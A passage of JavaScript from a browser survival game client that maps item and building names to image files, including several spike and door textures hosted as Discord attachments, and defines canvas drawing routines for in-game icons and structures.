      AMETHYST_BOWN: "img/night-amethyst-bow.png",
      AMETHYST_ARROWD: "img/day-amethyst-arrow.png",
      AMETHYST_ARROWN: "img/night-amethyst-arrow.png",
      INV_DRAGON_BOW_OUT: "img/inv-dragon-bow-out.png",
      INV_DRAGON_BOW_IN: "img/inv-dragon-bow-in.png",
      INV_DRAGON_BOW_CLICK: "img/inv-dragon-bow-click.png",
      INV_DRAGON_ARROW_OUT: "img/inv-dragon-arrow-out.png",
      INV_DRAGON_ARROW_IN: "img/inv-dragon-arrow-in.png",
      INV_DRAGON_ARROW_CLICK: "img/inv-dragon-arrow-click.png",
      DRAGON_BOWD: "img/day-dragon-bow.png",
      DRAGON_BOWN: "img/night-dragon-bow.png",
      DRAGON_ARROWD: "img/day-dragon-arrow.png",
      DRAGON_ARROWN: "img/night-dragon-arrow.png",
      INV_REIDITE_BOW_OUT: "img/inv-reidite-bow-out.png",
      INV_REIDITE_BOW_IN: "img/inv-reidite-bow-in.png",
      INV_REIDITE_BOW_CLICK: "img/inv-reidite-bow-click.png",
      INV_REIDITE_ARROW_OUT: "img/inv-reidite-arrow-out.png",
      INV_REIDITE_ARROW_IN: "img/inv-reidite-arrow-in.png",
      INV_REIDITE_ARROW_CLICK: "img/inv-reidite-arrow-click.png",
      REIDITE_BOWD: "img/day-reidite-bow.png",
      REIDITE_BOWN: "img/night-reidite-bow.png",
      REIDITE_ARROWD: "img/day-reidite-arrow.png",
      REIDITE_ARROWN: "img/night-reidite-arrow.png",
      BANDAGE_ACTIVATED: "img/bandage-activated.png",
      AUTO_FEED: "img/auto-feed.png",
      STOP_REGENERATION_BLIZZARD: "img/stop-regeneration.png",
      STOP_REGENERATION: "img/stop-regeneration2.png",
      WOOD_TOWERD: "img/day-wood-platform.png",
      WOOD_TOWERN: "img/night-wood-platform.png",
      INV_WOOD_TOWER_IN: "img/inv-wood-platform-in.png",
      INV_WOOD_TOWER_OUT: "img/inv-wood-platform-out.png",
      INV_WOOD_TOWER_CLICK: "img/inv-wood-platform-click.png",
      WOOD_SHIELDD: "img/day-wood-shield.png",
      WOOD_SHIELDN: "img/night-wood-shield.png",
      STONE_SHIELDD: "img/day-stone-shield.png",
      STONE_SHIELDN: "img/night-stone-shield.png",
      GOLD_SHIELDD: "img/day-gold-shield.png",
      GOLD_SHIELDN: "img/night-gold-shield.png",
      DIAMOND_SHIELDD: "img/day-diamond-shield.png",
      DIAMOND_SHIELDN: "img/night-diamond-shield.png",
      AMETHYST_SHIELDD: "img/day-amethyst-shield.png",
      AMETHYST_SHIELDN: "img/night-amethyst-shield.png",
      REIDITE_SHIELDD: "img/day-reidite-shield.png",
      REIDITE_SHIELDN: "img/night-reidite-shield.png",
      INV_WOOD_SHIELD_IN: "img/inv-wood-shield-in.png",
      INV_WOOD_SHIELD_OUT: "img/inv-wood-shield-out.png",
      INV_WOOD_SHIELD_CLICK: "img/inv-wood-shield-click.png",
      INV_STONE_SHIELD_IN: "img/inv-stone-shield-in.png",
      INV_STONE_SHIELD_OUT: "img/inv-stone-shield-out.png",
      INV_STONE_SHIELD_CLICK: "img/inv-stone-shield-click.png",
      INV_GOLD_SHIELD_IN: "img/inv-gold-shield-in.png",
      INV_GOLD_SHIELD_OUT: "img/inv-gold-shield-out.png",
      INV_GOLD_SHIELD_CLICK: "img/inv-gold-shield-click.png",
      INV_DIAMOND_SHIELD_IN: "img/inv-diamond-shield-in.png",
      INV_DIAMOND_SHIELD_OUT: "img/inv-diamond-shield-out.png",
      INV_DIAMOND_SHIELD_CLICK: "img/inv-diamond-shield-click.png",
      INV_AMETHYST_SHIELD_IN: "img/inv-amethyst-shield-in.png",
      INV_AMETHYST_SHIELD_OUT: "img/inv-amethyst-shield-out.png",
      INV_AMETHYST_SHIELD_CLICK: "img/inv-amethyst-shield-click.png",
      INV_REIDITE_SHIELD_IN: "img/inv-reidite-shield-in.png",
      INV_REIDITE_SHIELD_OUT: "img/inv-reidite-shield-out.png",
      INV_REIDITE_SHIELD_CLICK: "img/inv-reidite-shield-click.png",
      MACHETED: "img/day-machete.png",
      MACHETEN: "img/night-machete.png",
      INV_MACHETE_IN: "img/inv-machete-in.png",
      INV_MACHETE_OUT: "img/inv-machete-out.png",
      INV_MACHETE_CLICK: "img/inv-machete-click.png"
    };
    IMAGES[10000] = "https://cdn.discordapp.com/attachments/1077973699296247818/1078218084638261320/wood_spike.png";
    IMAGES[10001] = "https://cdn.discordapp.com/attachments/1077973699296247818/1078218084831203348/wood_spike_enemy.png";
    IMAGES[10002] = "https://cdn.discordapp.com/attachments/1077973699296247818/1078218085045129286/stone_spike.png";
    IMAGES[10003] = "https://cdn.discordapp.com/attachments/1077973699296247818/1078218085263212565/stone_spike_enemy.png";
    IMAGES[10004] = "https://cdn.discordapp.com/attachments/1077973699296247818/1078218085649109034/gold_spike.png";
    IMAGES[10005] = "https://cdn.discordapp.com/attachments/1077973699296247818/1078218085430988850/gold_spike_enemy.png";
    IMAGES[10006] = "https://cdn.discordapp.com/attachments/1077973699296247818/1078218085850415154/diamond_spike.png";
    IMAGES[10007] = "https://cdn.discordapp.com/attachments/1077973699296247818/1078218086064328764/diamond_spike_enemy.png";
    IMAGES[10008] = "https://cdn.discordapp.com/attachments/1077973699296247818/1078218086269866004/amethyst_spike.png";
    IMAGES[10009] = "https://cdn.discordapp.com/attachments/1077973699296247818/1078218086659915837/amethyst_spike_enemy.png";
    IMAGES[10010] = "https://cdn.discordapp.com/attachments/1077973699296247818/1078218104989040711/reidite_spike.png";
    IMAGES[10011] = "https://cdn.discordapp.com/attachments/1077973699296247818/1078218104770932796/reidite_spike_enemy.png";
    IMAGES[10012] = "https://cdn.discordapp.com/attachments/1077973699296247818/1079746165102358589/wood_spike_door.png";
    IMAGES[10013] = "https://cdn.discordapp.com/attachments/1077973699296247818/1079746165341438003/wood_spike_door_enemy.png";
    IMAGES[10014] = "https://cdn.discordapp.com/attachments/1077973699296247818/1079746165597294652/stone_spike_door.png";
    IMAGES[10015] = "https://cdn.discordapp.com/attachments/1077973699296247818/1079746165794418789/stone_spike_door_enemy.png";
    IMAGES[10016] = "https://cdn.discordapp.com/attachments/1077973699296247818/1079746166041886740/gold_spike_door.png.png";
    IMAGES[10017] = "https://cdn.discordapp.com/attachments/1077973699296247818/1079746166226440282/gold_spike_door_enemy.png";
    IMAGES[10018] = "https://cdn.discordapp.com/attachments/1077973699296247818/1079746166448730212/diamond_spike_door.png";
    IMAGES[10019] = "https://cdn.discordapp.com/attachments/1077973699296247818/1079746166679421049/diamond_spike_door_enemy.png";
    IMAGES[10020] = "https://cdn.discordapp.com/attachments/1077973699296247818/1079746166926880778/amethyst_spike_door.png";
    IMAGES[10021] = "https://cdn.discordapp.com/attachments/1077973699296247818/1079746167165960212/amethyst_spike_door_enemy.png";
    IMAGES[10022] = "https://cdn.discordapp.com/attachments/1077973699296247818/1079746184652001362/reidite_spike_door.png";
    IMAGES[10023] = "https://cdn.discordapp.com/attachments/1077973699296247818/1079746184937209896/reidite_spike_door_enemy.png";
    IMAGES[10024] = "https://cdn.discordapp.com/attachments/1077973699296247818/1079745936118534195/wood_door.png";
    IMAGES[10025] = "https://cdn.discordapp.com/attachments/1077973699296247818/1079745936391155792/wood_door_enemy.png";
    IMAGES[10026] = "https://cdn.discordapp.com/attachments/1077973699296247818/1079745936621850765/stone_door.png";
    IMAGES[10027] = "https://cdn.discordapp.com/attachments/1077973699296247818/1079745936835751996/stone_door_enemy.png";
    IMAGES[10028] = "https://cdn.discordapp.com/attachments/1077973699296247818/1079745937083219998/gold_door.png";
    IMAGES[10029] = "https://cdn.discordapp.com/attachments/1077973699296247818/1079745937334882344/gold_door_enemy.png";
    IMAGES[10030] = "https://cdn.discordapp.com/attachments/1077973699296247818/1079745937561366638/diamond_door.png";
    IMAGES[10031] = "https://cdn.discordapp.com/attachments/1077973699296247818/1079745937947246602/diamond_door_enemy.png";
    IMAGES[10032] = "https://cdn.discordapp.com/attachments/1077973699296247818/1079745938148577360/amethyst_door.png";
    IMAGES[10033] = "https://cdn.discordapp.com/attachments/1077973699296247818/1079745938412810240/amethyst_door_enemy.png";
    IMAGES[10034] = "https://cdn.discordapp.com/attachments/1077973699296247818/1079745980364247150/reidite_door.png";
    IMAGES[10035] = "https://cdn.discordapp.com/attachments/1077973699296247818/1079745980552982638/reidite_door_enemy.png";
    WINDOW12 = [{}];
    WINDOW12[0].stringify = function (e) {
      for (var i = new Uint8Array(new ArrayBuffer(e.length)), t = 0; t < e.length; t++) {
        i[t] = e[t];
      }
      return i;
    };
    DUMP_IMAGES = {};
    PREPROC_IMAGES = {};
    for (var Me in IMAGES) {
      DUMP_IMAGES[Me] = IMAGES[Me];
    }
    sprite = [];
    RARITY = {};
    RARITY.FREE = 0;
    RARITY.WOOD = 1;
    RARITY.STONE = 2;
    RARITY.GOLD = 3;
    RARITY.DIAMOND = 4;
    RARITY.AMETHYST = 5;
    RARITY.REIDITE = 6;
    RARITY.SPECIAL = 7;
    RARITY.LEVEL = 8;
    COSMETICS = {};
    MINIMAP_UTILS = [];
    find_cosmetics_per_id = function (e, i) {
      for (var t = 0; t < e.length; t++) {
        if (e[t].id === i) {
          return t;
        }
      }
      return -1;
    };
    var fe = [];
    function He(e, i) {
      for (var t = 0; t < fe.length; t += i) {
        var r = fe[t];
        if (r[0] === e) {
          Pe(r[0], r[1], r[2], r[3]);
        }
      }
    }
    function Pe(e, i, t, r) {
      var n = MINIMAP_UTILS[e];
      if (n !== undefined) {
        for (var a = 0; a < 2; a++) {
          var o = n[i][a];
          var s = r * 193 / s_.nw;
          var _ = t * 193 / s_.nh;
          var E = o.width / 3.5;
          var T = o.height / 3.5;
          sprite[Ie.MINIMAP_CTX][a].drawImage(o, s - E / 2, _ - T / 2, E, T);
          s = r * 600 / s_.nw;
          _ = t * 600 / s_.nh;
          E = o.width / 1.5;
          T = o.height / 1.5;
          sprite[Ie.BIGMAP_CTX][a].drawImage(o, s - E / 2, _ - T / 2, E, T);
        }
      }
    }
    function ye(e, i, t, r) {
      if (i) {
        e.fillStyle = i;
        e.fill();
      }
      if (t) {
        e.lineWidth = r;
        e.strokeStyle = t;
        e.stroke();
      }
    }
    function Be(e, i, t, r, n, a) {
      if (r < a * 2) {
        a = r / 2;
      }
      if (n < a * 2) {
        a = n / 2;
      }
      if (a < 0) {
        a = 0;
      }
      e.beginPath();
      e.moveTo(i + a, t);
      e.arcTo(i + r, t, i + r, t + n, a);
      e.arcTo(i + r, t + n, i, t + n, a);
      e.arcTo(i, t + n, i, t, a);
      e.arcTo(i, t, i + r, t, a);
      e.closePath();
    }
    function ze(e, i, t, r) {
      e.beginPath();
      e.arc(i, t, r, 0, Math.PI * 2);
    }
    function We(e, i, t, r, n) {
      e.beginPath();
      e.lineCap = "round";
      e.arc(i, t, r, 0, Math.PI * 2 * n);
    }
    function Ve(e, i, t, r) {
      var n = Math.PI * 2 / i;
      e.beginPath();
      for (var a = [{
          x: t,
          y: 0
        }], o = [], s = 1; s < i; s++) {
        a.push({
          x: Math.cos(s * n) * t,
          y: Math.sin(s * n) * t
        });
        var _ = a.length;
        o.push(Utils.middle_point(a[_ - 2], a[_ - 1]));
      }
      o.push(Utils.middle_point(a[a.length - 1], a[0]));
      var E = o[o.length - 1];
      e.moveTo(E.x, E.y);
      for (s = 0; s < i; s++) {
        e.arcTo(a[s].x, a[s].y, o[s].x, o[s].y, r);
      }
      e.closePath();
    }
    function we(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      var n = Math.sqrt(i.width * i.width + i.height * i.height);
      d2 = n / 2;
      t.width = n;
      t.height = n;
      r.translate(d2, d2);
      r.rotate(e);
      r.drawImage(i, -i.width / 2, -i.height / 2);
      return t;
    }
    function Ke(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      var n = Math.floor(e * 28);
      var a = Math.floor(e * 20);
      r.font = a + "px Baloo Paaji";
      var o = e * 8;
      var s = r.measureText(i).width + o * 2;
      t.width = s;
      t.height = n;
      Be(r, 0, 0, s, n, e * 10);
      r.globalAlpha = 0.5;
      ye(r, "#000");
      r.globalAlpha = 1;
      r.textBaseline = "middle";
      r.font = a + "px Baloo Paaji";
      r.beginPath();
      r.fillStyle = "#FFF";
      r.fillText(i, o, n / 2);
      return t;
    }
    function Ue(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      var n = e * 120;
      var a = e * 110;
      var o = n / 2;
      var s = a / 2;
      var _ = e * 20;
      var E = e * 112;
      var T = e * 82;
      var A = E / 2;
      var d = T / 2;
      var h = e * 4;
      t.width = n;
      t.height = a;
      r.globalAlpha = 1;
      r.translate(o, s);
      Be(r, -A, -d, E, T, _);
      ye(r, i, i, h);
      return t;
    }
    function Ye(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 264;
      r.height = e * 246;
      n.translate(0, e * 10);
      n.globalAlpha = i ? 0.5 : 1;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 75, e * 54);
      n.bezierCurveTo(e * 79, e * 21, e * 131, e * 13, e * 153, e * 36);
      n.bezierCurveTo(e * 204, e * 27, e * 221, e * 52, e * 216, e * 83);
      n.bezierCurveTo(e * 241, e * 103, e * 232, e * 138, e * 214, e * 147);
      n.bezierCurveTo(e * 223, e * 184, e * 201, e * 200, e * 175, e * 199);
      n.bezierCurveTo(e * 156, e * 218, e * 135, e * 222, e * 114, e * 203);
      n.bezierCurveTo(e * 62, e * 213, e * 66, e * 189, e * 59, e * 170);
      n.bezierCurveTo(e * 27, e * 164, e * 31, e * 134, e * 38, e * 123);
      n.bezierCurveTo(e * 11, e * 80, e * 51, e * 52, e * 75, e * 54);
      n.closePath();
      ye(n, t[0]);
      n.translate(0, e * -10);
      n.globalAlpha = 1;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 75, e * 54);
      n.bezierCurveTo(e * 79, e * 21, e * 131, e * 13, e * 153, e * 36);
      n.bezierCurveTo(e * 204, e * 27, e * 221, e * 52, e * 216, e * 83);
      n.bezierCurveTo(e * 241, e * 103, e * 232, e * 138, e * 214, e * 147);
      n.bezierCurveTo(e * 223, e * 184, e * 201, e * 200, e * 175, e * 199);
      n.bezierCurveTo(e * 156, e * 218, e * 135, e * 222, e * 114, e * 203);
      n.bezierCurveTo(e * 62, e * 213, e * 66, e * 189, e * 59, e * 170);
      n.bezierCurveTo(e * 27, e * 164, e * 31, e * 134, e * 38, e * 123);
      n.bezierCurveTo(e * 11, e * 80, e * 51, e * 52, e * 75, e * 54);
      n.closePath();
      ye(n, t[1], t[2], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 121, e * 102);
      n.bezierCurveTo(e * 111, e * 80, e * 110, e * 66, e * 108, e * 51);
      n.bezierCurveTo(e * 119, e * 65, e * 129, e * 85, e * 135, e * 99);
      n.bezierCurveTo(e * 142, e * 67, e * 146, e * 60, e * 152, e * 50);
      n.bezierCurveTo(e * 154, e * 71, e * 152, e * 85, e * 149, e * 104);
      n.bezierCurveTo(e * 166, e * 88, e * 175, e * 83, e * 188, e * 78);
      n.bezierCurveTo(e * 179, e * 91, e * 170, e * 103, e * 160, e * 112);
      n.bezierCurveTo(e * 186, e * 107, e * 191, e * 107, e * 204, e * 108);
      n.bezierCurveTo(e * 195, e * 114, e * 179, e * 120, e * 163, e * 123);
      n.bezierCurveTo(e * 183, e * 130, e * 186, e * 135, e * 192, e * 140);
      n.bezierCurveTo(e * 179, e * 141, e * 164, e * 139, e * 153, e * 135);
      n.bezierCurveTo(e * 158, e * 145, e * 163, e * 159, e * 165, e * 177);
      n.bezierCurveTo(e * 154, e * 166, e * 145, e * 153, e * 138, e * 139);
      n.bezierCurveTo(e * 133, e * 155, e * 125, e * 170, e * 117, e * 182);
      n.bezierCurveTo(e * 116, e * 160, e * 119, e * 151, e * 124, e * 138);
      n.bezierCurveTo(e * 107, e * 150, e * 95, e * 156, e * 82, e * 159);
      n.bezierCurveTo(e * 94, e * 140, e * 101, e * 136, e * 113, e * 128);
      n.bezierCurveTo(e * 78, e * 123, e * 75, e * 121, e * 67, e * 118);
      n.bezierCurveTo(e * 85, e * 112, e * 94, e * 112, e * 111, e * 113);
      n.bezierCurveTo(e * 89, e * 97, e * 85, e * 93, e * 78, e * 82);
      n.bezierCurveTo(e * 92, e * 85, e * 101, e * 90, e * 121, e * 102);
      n.closePath();
      ye(n, t[2]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 128, e * 103);
      n.bezierCurveTo(e * 111, e * 112, e * 117, e * 136, e * 140, e * 130);
      n.bezierCurveTo(e * 151, e * 126, e * 156, e * 115, e * 155, e * 107);
      n.bezierCurveTo(e * 155, e * 96, e * 154, e * 94, e * 148, e * 94);
      n.bezierCurveTo(e * 141, e * 94, e * 146, e * 104, e * 136, e * 104);
      n.closePath();
      ye(n, t[3], t[4], e * 4);
      return r;
    }
    function ke(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 70;
      r.height = e * 70;
      n.globalAlpha = 0.5;
      ze(n, e * 26, e * 26, e * 9);
      ye(n, t[0]);
      ze(n, e * 56, e * 36, e * 9);
      ye(n, t[1]);
      ze(n, e * 40, e * 50, e * 9);
      ye(n, t[2]);
      n.globalAlpha = 1;
      ze(n, e * 26, e * 26, e * 5);
      ye(n, t[0]);
      ze(n, e * 56, e * 36, e * 5);
      ye(n, t[1]);
      ze(n, e * 40, e * 50, e * 5);
      ye(n, t[2]);
      return r;
    }
    function Fe(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 22;
      r.height = e * 22;
      n.globalAlpha = 0.4;
      ze(n, e * 11, e * 11, e * 10);
      ye(n, t[0]);
      n.globalAlpha = 0.7;
      ze(n, e * 11, e * 11, e * 7);
      ye(n, t[0]);
      n.globalAlpha = 1;
      ze(n, e * 11, e * 11, e * 4);
      ye(n, t[0]);
      return r;
    }
    function xe(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 248;
      r.height = e * 247;
      n.save();
      n.translate(e * 69.5, e * 145);
      Be(n, e * -8.5, e * -63, e * 17, e * 127, e * 1);
      n.restore();
      ye(n, t[0]);
      n.save();
      n.translate(e * 183, e * 145);
      Be(n, e * -8, e * -63, e * 16, e * 126, e * 1);
      n.restore();
      ye(n, t[0]);
      n.save();
      n.translate(e * 123.5, e * 62.5);
      n.rotate(6.28);
      Be(n, e * -84.5, e * -25.5, e * 169, e * 51, e * 5);
      n.restore();
      ye(n, t[2], t[1], e * 6);
      n.save();
      n.translate(e * 123.5, e * 118);
      n.rotate(6.24);
      Be(n, e * -85.5, e * -24, e * 169, e * 48, e * 5);
      n.restore();
      ye(n, t[3], t[1], e * 6);
      n.save();
      n.translate(e * 122, e * 177.5);
      n.rotate(6.32);
      Be(n, e * -84, e * -23.5, e * 169, e * 47, e * 5);
      n.restore();
      ye(n, t[2], t[1], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 37, e * 157);
      n.bezierCurveTo(e * 49, e * 160, e * 49, e * 160, e * 61, e * 163);
      n.bezierCurveTo(e * 49.5, e * 165.5, e * 49.5, e * 165.5, e * 38, e * 168);
      n.closePath();
      ye(n, t[1]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 205, e * 175);
      n.bezierCurveTo(e * 192.5, e * 180, e * 192.5, e * 180, e * 180, e * 185);
      n.bezierCurveTo(e * 193, e * 188, e * 193, e * 188, e * 206, e * 191);
      n.closePath();
      ye(n, t[1]);
      return r;
    }
    function Je(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 248;
      r.height = e * 247;
      n.save();
      n.translate(e * 182, e * 120);
      Be(n, e * -8, e * -67, e * 16, e * 134, e * 1);
      n.restore();
      ye(n, t[0]);
      n.save();
      n.translate(e * 68.5, e * 127.5);
      Be(n, e * -8.5, e * -70.5, e * 17, e * 141, e * 1);
      n.restore();
      ye(n, t[0]);
      n.save();
      n.translate(e * 123.5, e * 68);
      Be(n, e * -82.5, e * -24, e * 165, e * 48, e * 4);
      n.restore();
      ye(n, t[2], t[1], e * 6);
      n.save();
      n.translate(e * 123, e * 179.5);
      Be(n, e * -83, e * -24.5, e * 166, e * 49, e * 4);
      n.restore();
      ye(n, t[2], t[1], e * 6);
      n.save();
      n.translate(e * 123.5, e * 123.5);
      n.rotate(6.24);
      Be(n, e * -82.5, e * -24.5, e * 165, e * 49, e * 4);
      n.restore();
      ye(n, t[3], t[1], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 204, e * 112);
      n.bezierCurveTo(e * 149, e * 121.5, e * 96, e * 130, e * 94, e * 131);
      n.bezierCurveTo(e * 149.5, e * 127.5, e * 149.5, e * 127.5, e * 205, e * 124);
      n.closePath();
      ye(n, t[1]);
      return r;
    }
    function Xe(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 248;
      r.height = e * 247;
      n.save();
      n.translate(e * 183, e * 107);
      Be(n, e * -8, e * -70.5, e * 16, e * 141, e * 1);
      n.restore();
      ye(n, t[0]);
      n.save();
      n.translate(e * 69.5, e * 110);
      Be(n, e * -8.5, e * -71, e * 17, e * 143, e * 1);
      n.restore();
      ye(n, t[0]);
      n.save();
      n.translate(e * 123.5, e * 181);
      Be(n, e * -84.5, e * -26, e * 169, e * 52, e * 5);
      n.restore();
      ye(n, t[2], t[1], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 41, e * 95);
      n.bezierCurveTo(e * 105, e * 96, e * 113, e * 99, e * 134, e * 102);
      n.bezierCurveTo(e * 147, e * 106, e * 173, e * 100, e * 207, e * 105);
      n.bezierCurveTo(e * 210, e * 105, e * 207, e * 140, e * 207, e * 154);
      n.bezierCurveTo(e * 123.5, e * 151.5, e * 123.5, e * 151.5, e * 40, e * 149);
      n.bezierCurveTo(e * 37, e * 145, e * 39, e * 95, e * 41, e * 96);
      n.closePath();
      ye(n, t[2], t[1], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 68, e * 75);
      n.bezierCurveTo(e * 54, e * 72.5, e * 54, e * 72.5, e * 40, e * 70);
      n.bezierCurveTo(e * 38, e * 46, e * 40, e * 46, e * 53, e * 46);
      n.bezierCurveTo(e * 201, e * 41, e * 201, e * 41, e * 201, e * 42);
      n.bezierCurveTo(e * 211, e * 40, e * 208, e * 53, e * 208, e * 72);
      n.bezierCurveTo(e * 209, e * 91, e * 210, e * 96, e * 194, e * 94);
      n.bezierCurveTo(e * 119, e * 97, e * 119, e * 97, e * 44, e * 100);
      n.bezierCurveTo(e * 39, e * 99, e * 40, e * 96, e * 40, e * 80);
      n.bezierCurveTo(e * 54, e * 77.5, e * 54, e * 77.5, e * 68, e * 75);
      n.closePath();
      ye(n, t[3], t[1], e * 6);
      return r;
    }
    function qe(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 191;
      r.height = e * 153;
      n.globalAlpha = 0.5;
      n.translate(0, e * 10);
      n.save();
      n.translate(e * 97.49996948242188, e * 95.12844848632812);
      Be(n, e * -62.5, e * -41.5, e * 125, e * 83, e * 20);
      n.restore();
      ye(n, t[0], t[0], e * 4);
      n.globalAlpha = 1;
      n.translate(0, e * -10);
      n.save();
      n.translate(e * 97.49996948242188, e * 95.12844848632812);
      Be(n, e * -62.5, e * -41.5, e * 125, e * 83, e * 20);
      n.restore();
      ye(n, t[1], t[2], e * 4);
      n.globalCompositeOperation = "destination-out";
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 26.999969482421875, e * 50.850677490234375);
      n.bezierCurveTo(e * 46.499969482421875, e * 64.85067749023438, e * 46.499969482421875, e * 64.85067749023438, e * 65.99996948242188, e * 78.85067749023438);
      n.bezierCurveTo(e * 80.99996948242188, e * 87.85067749023438, e * 105.99996948242188, e * 82.85067749023438, e * 114.99996948242188, e * 80.85067749023438);
      n.bezierCurveTo(e * 130.99996948242188, e * 69.85067749023438, e * 152.99996948242188, e * 70.85067749023438, e * 166.99996948242188, e * 67.85067749023438);
      n.bezierCurveTo(e * 156.99996948242188, e * 52.850677490234375, e * 156.99996948242188, e * 52.850677490234375, e * 146.99996948242188, e * 37.850677490234375);
      n.bezierCurveTo(e * 101.49996948242188, e * 37.350677490234375, e * 101.49996948242188, e * 37.350677490234375, e * 55.999969482421875, e * 36.850677490234375);
      n.closePath();
      ye(n, t[2], t[3], e * 4);
      n.globalCompositeOperation = "source-over";
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 40.999969482421875, e * 59.850677490234375);
      n.bezierCurveTo(e * 41.999969482421875, e * 50.850677490234375, e * 47.999969482421875, e * 47.850677490234375, e * 56.999969482421875, e * 49.850677490234375);
      n.bezierCurveTo(e * 65.99996948242188, e * 41.850677490234375, e * 76.99996948242188, e * 42.850677490234375, e * 90.99996948242188, e * 47.850677490234375);
      n.bezierCurveTo(e * 94.99996948242188, e * 42.850677490234375, e * 104.99996948242188, e * 42.850677490234375, e * 114.99996948242188, e * 47.850677490234375);
      n.bezierCurveTo(e * 131.99996948242188, e * 42.850677490234375, e * 142.99996948242188, e * 48.850677490234375, e * 145.99996948242188, e * 56.850677490234375);
      n.bezierCurveTo(e * 160.99996948242188, e * 63.850677490234375, e * 154.99996948242188, e * 69.85067749023438, e * 155.99996948242188, e * 70.85067749023438);
      n.bezierCurveTo(e * 141.99996948242188, e * 71.85067749023438, e * 141.99996948242188, e * 71.85067749023438, e * 127.99996948242188, e * 72.85067749023438);
      n.bezierCurveTo(e * 110.99996948242188, e * 83.85067749023438, e * 107.99996948242188, e * 82.85067749023438, e * 90.99996948242188, e * 85.85067749023438);
      n.bezierCurveTo(e * 70.99996948242188, e * 83.85067749023438, e * 64.99996948242188, e * 79.85067749023438, e * 53.999969482421875, e * 70.85067749023438);
      n.closePath();
      ye(n, t[3], t[4], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 33.999969482421875, e * 65.85067749023438);
      n.bezierCurveTo(e * 36.999969482421875, e * 59.850677490234375, e * 34.999969482421875, e * 60.850677490234375, e * 39.999969482421875, e * 59.850677490234375);
      n.bezierCurveTo(e * 47.999969482421875, e * 61.850677490234375, e * 62.999969482421875, e * 76.85067749023438, e * 74.99996948242188, e * 79.85067749023438);
      n.bezierCurveTo(e * 93.99996948242188, e * 85.85067749023438, e * 111.99996948242188, e * 83.85067749023438, e * 124.99996948242188, e * 70.85067749023438);
      n.bezierCurveTo(e * 129.99996948242188, e * 67.85067749023438, e * 145.99996948242188, e * 65.85067749023438, e * 159.99996948242188, e * 67.85067749023438);
      n.bezierCurveTo(e * 159.99996948242188, e * 71.85067749023438, e * 159.99996948242188, e * 71.85067749023438, e * 159.99996948242188, e * 75.85067749023438);
      n.bezierCurveTo(e * 146.99996948242188, e * 72.85067749023438, e * 144.99996948242188, e * 75.85067749023438, e * 143.99996948242188, e * 82.85067749023438);
      n.bezierCurveTo(e * 144.99996948242188, e * 86.85067749023438, e * 140.99996948242188, e * 90.85067749023438, e * 137.99996948242188, e * 86.85067749023438);
      n.bezierCurveTo(e * 139.99996948242188, e * 72.85067749023438, e * 135.99996948242188, e * 72.85067749023438, e * 133.99996948242188, e * 82.85067749023438);
      n.bezierCurveTo(e * 127.99996948242188, e * 88.85067749023438, e * 124.99996948242188, e * 70.85067749023438, e * 116.99996948242188, e * 86.85067749023438);
      n.bezierCurveTo(e * 110.99996948242188, e * 91.85067749023438, e * 96.99996948242188, e * 81.85067749023438, e * 89.99996948242188, e * 90.85067749023438);
      n.bezierCurveTo(e * 85.99996948242188, e * 92.85067749023438, e * 81.99996948242188, e * 95.85067749023438, e * 76.99996948242188, e * 86.85067749023438);
      n.bezierCurveTo(e * 67.99996948242188, e * 93.85067749023438, e * 67.99996948242188, e * 91.85067749023438, e * 60.999969482421875, e * 79.85067749023438);
      n.bezierCurveTo(e * 53.999969482421875, e * 71.85067749023438, e * 52.999969482421875, e * 72.85067749023438, e * 46.999969482421875, e * 77.85067749023438);
      n.bezierCurveTo(e * 41.999969482421875, e * 78.85067749023438, e * 42.999969482421875, e * 69.85067749023438, e * 33.999969482421875, e * 65.85067749023438);
      n.closePath();
      ye(n, t[5], t[6], e * 4);
      ze(n, e * 68, e * 111.29513549804688, e * 15);
      ye(n, t[7], t[8], e * 4);
      ze(n, e * 123, e * 111.29510498046875, e * 15);
      ye(n, t[7], t[8], e * 4);
      ze(n, e * 63, e * 106, e * 5);
      ye(n, t[9]);
      ze(n, e * 118, e * 106, e * 5);
      ye(n, t[9]);
      return r;
    }
    function je(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 191;
      r.height = e * 153;
      n.globalAlpha = 0.5;
      n.translate(0, e * 10);
      n.save();
      n.translate(e * 96.49996948242188, e * 66.79510498046875);
      n.rotate(0);
      Be(n, e * -79.5, e * -48.5, e * 159, e * 97, e * 22);
      n.restore();
      ye(n, t[0], t[0], e * 4);
      n.globalAlpha = 1;
      n.translate(0, e * -10);
      n.save();
      n.translate(e * 96.49996948242188, e * 66.79510498046875);
      n.rotate(0);
      Be(n, e * -79.5, e * -48.5, e * 159, e * 97, e * 22);
      n.restore();
      ye(n, t[1], t[2], e * 4);
      n.translate(e * 2, 0);
